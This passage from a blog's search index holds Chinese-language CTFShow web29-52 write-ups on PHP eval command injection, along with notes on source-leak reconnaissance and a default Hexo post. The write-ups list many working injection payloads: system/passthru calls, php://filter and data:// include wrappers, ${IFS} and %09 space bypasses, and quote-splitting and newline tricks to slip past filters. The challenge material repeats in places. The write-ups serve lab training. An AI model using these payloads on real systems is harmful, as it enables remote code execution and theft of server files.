换行符 \n 在 Unix&#x2F;Linux 系统的命令行里是命令的分隔符。所以，上述命令会先执行 ls 命令，该命令用于列出当前目录下的文件和文件夹。</p><p>换行之后，&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 成为了另一个独立的命令。但这个命令并没有实际的命令主体，它只是一个空的重定向操作。</p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a8d6efd1-702a-4b0c-ba05-50db366e5feb.jpg" alt="a8d6efd1-702a-4b0c-ba05-50db366e5feb">!](.&#x2F;img&#x2F;a8d6efd1-702a-4b0c-ba05-50db366e5feb.jpg)</p><p>43 过滤了; tac flag.php|| 或者%0a 或者&amp; URL编码后%26 </p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d.jpg" alt="2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d">!](.&#x2F;img&#x2F;2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d.jpg)</p><p>44 ?c&#x3D;tac fla*||</p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/35e0ef5d-1414-4704-a7a0-dd8b67a77765.jpg" alt="35e0ef5d-1414-4704-a7a0-dd8b67a77765">!](.&#x2F;img&#x2F;35e0ef5d-1414-4704-a7a0-dd8b67a77765.jpg)</p><p>45 过滤了空格用%09 ${IFS} ?c&#x3D;tac${IFS}fla*||</p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/6604ed43-bf17-4c5b-b1fb-46dd73f12222.jpg" alt="6604ed43-bf17-4c5b-b1fb-46dd73f12222">!](.&#x2F;img&#x2F;6604ed43-bf17-4c5b-b1fb-46dd73f12222.jpg)</p><p>46 过滤了空格数字  用%09 这里的 %09 被当作普通空白符处理 $被过滤 不能用${IFS} 空格还可以用&lt;或者&lt;&gt;代替空格</p><p>?c&#x3D;tac%09fla?.php|| 过滤了* 用?也可以代替任意一个字符 </p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a6bc6cd8-d169-447e-8103-00a611b7423e.jpg" alt="a6bc6cd8-d169-447e-8103-00a611b7423e">!](.&#x2F;img&#x2F;a6bc6cd8-d169-447e-8103-00a611b7423e.jpg)</p><p>47 ?c&#x3D;tac%09fla?.php||  绕过flag还可以用f’’lag  在正则匹配中?代表通配符 但在正则匹配中 ?表示前面一个字符出现零次或一次</p><p>48 49同上</p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a6bc6cd8-d169-447e-8103-00a611b7423e-1744549925976-13.jpg" alt="a6bc6cd8-d169-447e-8103-00a611b7423e">!](.&#x2F;img&#x2F;a6bc6cd8-d169-447e-8103-00a611b7423e.jpg)</p><p>49 这里过滤了09 所以不能用%09代表空格 之前过滤%和数字 %09仍能用 过滤规则只是简单地查找并移除单个的百分号和数字字符，没有对连续的 %XX （XX 为十六进制数字）形式进行处理。所以 %09 会被当作普通字符序列保留下来，没有被过滤掉。</p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/78455c18-cb78-4c6e-a49e-7464ddcc5eed.jpg" alt="78455c18-cb78-4c6e-a49e-7464ddcc5eed">!](.&#x2F;img&#x2F;78455c18-cb78-4c6e-a49e-7464ddcc5eed.jpg)</p><p>50 ?c&#x3D;tac&lt;fla’’g.php|| </p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/2f3641b0-10f1-4962-b2a8-82703122f328.jpg" alt="2f3641b0-10f1-4962-b2a8-82703122f328">!](.&#x2F;img&#x2F;2f3641b0-10f1-4962-b2a8-82703122f328.jpg)</p><p>51  ?c&#x3D;t’’ac&lt;fl’’ag.php%0a 过滤了tac 用t’’ac</p><p>nl、more 和 vi 命令都可以用于查看文件内容，但在功能和使用方式上有所不同：</p><p><strong>·</strong> <em><strong>*nl*</strong></em> <em><strong>*命令*</strong></em>：主要用于显示文件内容，并为每行加上行号。例如，执行 nl file.txt 会将 file.txt 的内容逐行显示出来，同时在每行前面加上对应的行号，方便用户对文件中的行进行定位和引用。</p><p><strong>·</strong> <em><strong>*more*</strong></em> <em><strong>*命令*</strong></em>：用于分页显示文件内容。当文件内容较多，一屏无法完全显示时，more 会将文件内容按页显示，用户可以通过按空格键或回车键等方式逐页或逐行查看文件内容。例如，more large_file.txt 会以分页的形式显示 large_file.txt 的内容，便于用户查看。</p><p><strong>·</strong> <em><strong>*vi*</strong></em> <em><strong>*命令*</strong></em>：不仅可以查看文件内容，还能对文件进行编辑。使用 vi 打开文件后，默认处于命令模式，用户可以通过各种命令进行光标移动、文本查找等操作来查看文件内容。若要对文件进行修改，则需进入插入模式。例如，vi config.php 可以打开 config.php 文件进行查看和编辑。</p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/82bcfa46-9fb3-4213-b1ae-e10853679a2c.jpg" alt="82bcfa46-9fb3-4213-b1ae-e10853679a2c">!](.&#x2F;img&#x2F;82bcfa46-9fb3-4213-b1ae-e10853679a2c.jpg)</p><p>52 ?c&#x3D;nl${IFS}&#x2F;fla’’g%0a &lt;被过滤 用${IFS}&#x2F; </p><p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/eec2ce71-c80c-41a0-b45e-691b2770eaff.jpg" alt="eec2ce71-c80c-41a0-b45e-691b2770eaff">!](.&#x2F;img&#x2F;eec2ce71-c80c-41a0-b45e-691b2770eaff.jpg)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/04/13/ctfshow%20web29-52%20(%E9%83%A8%E5%88%86%EF%BC%89/"/>
      <url>/2025/04/13/ctfshow%20web29-52%20(%E9%83%A8%E5%88%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>Web29 </p><p><img src="https://i-blog.csdnimg.cn/direct/d998a912ddf44a6dbc2419acbad09518.png" alt="在这里插入图片描述"></p><p>eval函数表示把后面的内容当成php代码执行，</p><ol><li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>而不能直接?c&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 因为后面的内容不是标准的php代码<br>2.?c&#x3D;system(“ls”); 发现有flag.php,又system(“tac fla*”);<br>3.?c&#x3D;echo `tac fla*&#96;; 注意要用反引号`&#96;包起来 这个反引号代替了system函数</li></ol><p><img src="https://i-blog.csdnimg.cn/direct/3cd6a0560bd24091b97867ab9198c94c.png"></p><p>30 system被过滤也可以用passthru来替代system执行系统命令<br><img src="https://i-blog.csdnimg.cn/direct/456388f310ac4e12bd7b7e76507fef1e.png" alt="在这里插入图片描述"></p><p>31 过滤了空格，可以使用%09替代；也可以使用$IFS$9，${IFS}，$IFS这三个都行<br>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac fla*”)；<br>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac${IFS}$fla*”); 注意要用转义字符\</p><p><img src="https://i-blog.csdnimg.cn/direct/1ba9b4e817914d78b4cefe2d4e453ca6.png" alt="在这里插入图片描述"><br>32  ?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?><br>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br><img src="https://i-blog.csdnimg.cn/direct/c2828ed2136d4d778900daca8ea50a36.png" alt="在这里插入图片描述"><br>38看到include 用伪协议 过滤了php 用data ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system(“tac fla*”);?><br>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system("tac fla*")?><br><?= 是简化的 <?php echo ... ?><br><img src="https://i-blog.csdnimg.cn/direct/6c5fc2187d5c49bea88e0282701070b9.png" alt="在这里插入图片描述"><br>40题?c&#x3D;echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));：这是一个GET请求的参数c，其值是一个PHP表达式。<br>echo：PHP中的输出函数，用于输出字符串或表达式的结果。<br>highlight_file：PHP中的函数，用于高亮显示PHP文件的内容。<br>next：PHP中的函数，用于将内部指针向前移动到下一个元素。<br>array_reverse：PHP中的函数，用于反转数组元素的顺序。<br>scandir：PHP中的函数，用于列出目录中的文件和子目录。<br>pos：PHP中的函数，返回数组中当前内部指针指向的值。<br>localeconv()：PHP中的函数，返回本地化的数字和货币格式信息。<br>具体来说，这段代码的执行流程如下：</p><p>localeconv()：获取本地化的数字和货币格式信息。<br>pos(localeconv())：获取localeconv()返回数组中当前内部指针指向的值。<br>scandir(pos(localeconv()))：列出pos(localeconv())指向的目录中的文件和子目录。<br>array_reverse(scandir(pos(localeconv())))：反转这些文件和子目录的顺序。<br>next(array_reverse(scandir(pos(localeconv()))))：将内部指针移动到下一个元素，即下一个文件或子目录。<br>highlight_file(next(array_reverse(scandir(pos(localeconv())))))：高亮显示这个文件的内容。<br>echo：输出这个高亮显示的内容。<br>payload2：<br>?c&#x3D;eval(next(reset(get_defined_vars())));&amp;1&#x3D;;system(“tac%20flag.php”);<br>1<br>payload2解释：<br>?c&#x3D;eval(next(reset(get_defined_vars())));：这是GET请求的一部分，其中c参数的值是一个PHP表达式。</p><p>get_defined_vars()：这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。<br>reset()：这个函数将数组内部指针指向第一个元素，并返回该元素的值。<br>next()：这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。<br>eval()：这个函数执行字符串作为PHP代码。<br>这段代码的目的是尝试执行get_defined_vars()返回的第一个元素的下一个元素的值作为PHP代码。</p><p>&amp;1&#x3D;;system(“tac%20flag.php”);：这是GET请求的另一部分，尝试通过URL参数执行系统命令。</p><p>system()：这个函数执行一个shell命令，并将完整的输出返回。<br>“tac%20flag.php”：这里的命令是tac flag.php，tac是反向输出文件内容的Unix命令，%20是URL编码的空格。<br>这段代码的目的是尝试执行flag.php文件的反向内容。</p><p>原文链接：<a href="https://blog.csdn.net/LongL_GuYu/article/details/140787997">https://blog.csdn.net/LongL_GuYu/article/details/140787997</a><br><img src="https://i-blog.csdnimg.cn/direct/ac258928b27c4cd9be04c492d6dd26c9.png" alt="在这里插入图片描述"><br>dev&#x2F;null 2&gt;&amp;1<br>command &gt; &#x2F;dev&#x2F;null ：符号 &gt; 是重定向操作符，此命令将 command 的标准输出重定向到 &#x2F;dev&#x2F;null ，即正常运行结果被丢弃。例如 echo “Hello” &gt; &#x2F;dev&#x2F;null ，屏幕上不会显示 “Hello” 。<br>command 2&gt; &#x2F;dev&#x2F;null ：2&gt; 用于将标准错误输出重定向，该命令会把 command 执行过程中产生的错误信息发送到 &#x2F;dev&#x2F;null 。比如 find &#x2F; -name non_existent_file 2&gt;&#x2F;dev&#x2F;null ，查找过程中因权限不足等产生的错误提示就不会显示 。<br>command &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1（等价于 command &amp;&gt; &#x2F;dev&#x2F;null ） ：</p><blockquote><p>先将标准输出重定向到 &#x2F;dev&#x2F;null 。<br>2&gt;&amp;1 中 2 代表标准错误输出，&amp; 表示绑定，1 是标准输出，即把标准错误输出绑定到标准输出，由于标准输出已定向到 &#x2F;dev&#x2F;null ，所以标准错误输出也被定向到 &#x2F;dev&#x2F;null ，命令所有输出都被丢弃。常用于不想看到命令任何输出，或避免输出干扰、减少日志量等场景 。比如在运行一些后台脚本任务时，可让其输出不显示在终端 。<br>解法1 ?c&#x3D;ls;  ?c&#x3D;tac fla.php; ;后面为空，丢进黑洞的就是空 当用户传入 tac flag.php;ls 时，实际执行的命令变为 tac flag.php;ls &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1。此时，重定向操作 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 只对 ls 命令生效，因为它是重定向符号后面紧邻的命令，而 tac flag.php 命令不受影响，其输出会正常显示，从而绕过了 &#x2F;dev&#x2F;null 对输出的屏蔽</p></blockquote><p>解法2 ?c&#x3D;tac flag.php||   逻辑或|| 当有一个为真则为真，A||B 若A为真，则只进行A 不管B<br>解法3  ?c&#x3D;ls%26  &amp;的URL编码是%26    在命令 ls &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 中，重定向操作 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 是针对 &amp; 之后的部分，而 &amp; 会将 ls 命令放到后台执行，使得 ls 命令独立于重定向操作。也就是说，重定向操作无法影响到已经被放到后台执行的 ls 命令，所以 ls 命令的输出不会被重定向到 &#x2F;dev&#x2F;null，而是正常显示出来。  &amp; 也可以看作是命令分隔符的一种特殊形式。它和分号 ; 类似，都能分隔多个命令，但 &amp; 会让前面的命令在后台运行。<br>?c&#x3D;ls%26%26 同理<br>逻辑与运算符&amp;&amp; 条件1&amp;&amp;条件2 当1为真继续2 若1为假 则2就不管了<br>按位与运算符&amp; 用于对两个整数的二进制位进行逐位比较。只有当两个对应位都为 1 时，结果的该位才为 1，否则为 0。<br>当用于布尔值时，&amp; 也可以作为逻辑与运算符，但它不具有短路特性。无论第一个表达式的结果如何，都会计算第二个表达式。<br>解法4 ?c&#x3D;ls%0a  ?c&#x3D;tac flag.php%0a 在 URL 编码里，%0a 代表换行符（\n） 换行符 \n 在 Unix&#x2F;Linux 系统的命令行里是命令的分隔符。所以，上述命令会先执行 ls 命令，该命令用于列出当前目录下的文件和文件夹。<br>换行之后，&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 成为了另一个独立的命令。但这个命令并没有实际的命令主体，它只是一个空的重定向操作。</p><p><img src="https://i-blog.csdnimg.cn/direct/18552782bc6d444b8c1ce385ad74dd81.png" alt="在这里插入图片描述"><br>43 过滤了; tac flag.php|| 或者%0a 或者&amp; URL编码后%26<br><img src="https://i-blog.csdnimg.cn/direct/79b9fcfb6c3b4524b8f9e2dca5697d42.png" alt="在这里插入图片描述"><br>44 ?c&#x3D;tac fla*||<br><img src="https://i-blog.csdnimg.cn/direct/299950984d2d43f39db7c81e65b3ded5.png" alt="在这里插入图片描述"><br>45 过滤了空格用%09 ${IFS} ?c&#x3D;tac${IFS}fla*||<br><img src="https://i-blog.csdnimg.cn/direct/88dbbbe8445540d3aab25a80fb1bdf77.png" alt="在这里插入图片描述"><br>46 过滤了空格数字  用%09 这里的 %09 被当作普通空白符处理 $被过滤 不能用${IFS} 空格还可以用&lt;或者&lt;&gt;代替空格<br>?c&#x3D;tac%09fla?.php|| 过滤了* 用?也可以代替任意一个字符<br><img src="https://i-blog.csdnimg.cn/direct/404230580271469196b1a1dc690c13fd.png" alt="在这里插入图片描述"><br>47 ?c&#x3D;tac%09fla?.php||   绕过flag还可以用f’’lag  在正则匹配中?代表通配符 但在正则匹配中 ?表示前面一个字符出现零次或一次<br><img src="https://i-blog.csdnimg.cn/direct/8a260c15430a43dd9ef28e74dc0c1e8c.png" alt="在这里插入图片描述"><br>49 这里过滤了09 所以不能用%09代表空格 之前过滤%和数字 %09仍能用 过滤规则只是简单地查找并移除单个的百分号和数字字符，没有对连续的 %XX （XX 为十六进制数字）形式进行处理。所以 %09 会被当作普通字符序列保留下来，没有被过滤掉。<br><img src="https://i-blog.csdnimg.cn/direct/4b4b60de8c4d452583e874bb8ef008fb.png" alt="在这里插入图片描述"><br>50 ?c&#x3D;tac&lt;fla’’g.php||<br><img src="https://i-blog.csdnimg.cn/direct/87c61c55d27043a1b13b887d8bbeebc1.png" alt="在这里插入图片描述"><br>51  ?c&#x3D;t’’ac&lt;fl’’ag.php%0a 过滤了tac 用t’’ac<br>nl、more 和 vi 命令都可以用于查看文件内容，但在功能和使用方式上有所不同：</p><p>nl 命令：主要用于显示文件内容，并为每行加上行号。例如，执行 nl file.txt 会将 file.txt 的内容逐行显示出来，同时在每行前面加上对应的行号，方便用户对文件中的行进行定位和引用。<br>more 命令：用于分页显示文件内容。当文件内容较多，一屏无法完全显示时，more 会将文件内容按页显示，用户可以通过按空格键或回车键等方式逐页或逐行查看文件内容。例如，more large_file.txt 会以分页的形式显示 large_file.txt 的内容，便于用户查看。<br>vi 命令：不仅可以查看文件内容，还能对文件进行编辑。使用 vi 打开文件后，默认处于命令模式，用户可以通过各种命令进行光标移动、文本查找等操作来查看文件内容。若要对文件进行修改，则需进入插入模式。例如，vi config.php 可以打开 config.php 文件进行查看和编辑。<br><img src="https://i-blog.csdnimg.cn/direct/6512d4273c40450eb778e65c77a34bc2.png" alt="在这里插入图片描述"><br>52 ?c&#x3D;nl${IFS}&#x2F;fla’’g%0a &lt;被过滤 用${IFS}&#x2F; </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/04/13/ctfshow%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2025/04/13/ctfshow%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。即，Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots ExclusionProtocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br> robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。</p><p>phps源码泄露 在URL后面加index.phps<br>常见的文件备份后缀‘.git’ <strong>‘.swp’</strong>‘.bash_history’<strong>‘.bkf’</strong>‘.svn’ ‘.bak’’.~’<br>在Linux生产环境上使用vim或者vi做修改时，会生成一个swp为后缀的文件</p><p>第一次意外退出生成的是.swp<br>第二次意外退出生成的是.swo<br>第三次为.swn<br>因此可以尝试打开第一次退出时产生的这个文件,输入url&#x2F;index.php.swp</p><p>看到探针，url+tz.php</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2025/04/13/robots.txt/"/>
      <url>/2025/04/13/robots.txt/</url>
      
        <content type="html"><![CDATA[<p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。即，Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots ExclusionProtocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br>robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>robots.txt</title>
      <link href="/2025/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2025/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。即，Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots ExclusionProtocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br>robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>My New Blog Post</title>
      <link href="/2025/04/09/My-New-Blog-Post/"/>
      <url>/2025/04/09/My-New-Blog-Post/</url>
      
        <content type="html"><![CDATA[<p>111111</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/04/07/hello-world/"/>
      <url>/2025/04/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
